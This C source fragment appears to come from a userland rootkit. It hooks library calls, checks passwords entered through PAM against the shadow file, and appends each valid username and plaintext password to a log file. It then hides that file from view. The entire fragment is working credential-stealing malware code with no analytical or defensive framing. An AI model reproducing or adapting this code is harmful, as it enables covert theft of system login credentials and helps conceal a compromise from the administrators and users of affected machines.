int verify_pass(char *user, char *resp){
    struct spwd *ent;
    char *pass;
    int got_pw;

    hook(CGETSPNAM);
    ent = call(CGETSPNAM, user);
    if(ent == NULL || strlen(ent->sp_pwdp) < 2)
        return 0;

    pass = crypt(resp, ent->sp_pwdp);
    if(pass == NULL) return 0;

    got_pw = !strcmp(pass, ent->sp_pwdp);
    if(got_pw) return 1;

    return 0;
}

void log_auth(pam_handle_t *pamh, char *resp){
    char *user;
    int  got_pw;
    FILE *fp;

    hook(CFOPEN, CFWRITE);

    user = get_username(pamh);
    if(user == NULL) return;

    got_pw = verify_pass(user, resp);
    if(!got_pw) return;

    char logbuf[strlen(user)+strlen(resp)+64];
    memset(logbuf, 0, sizeof(logbuf));
    snprintf(logbuf, sizeof(logbuf), LOG_FMT, user, resp);

    if(alreadylogged(LOG_PATH, logbuf))
        return;

    fp = call(CFOPEN, LOG_PATH, "a");
    if(fp == NULL) return;
    call(CFWRITE, logbuf, 1, strlen(logbuf), fp);
    fclose(fp);

    if(!hidden_path(LOG_PATH))
        hide_path(LOG_PATH);
}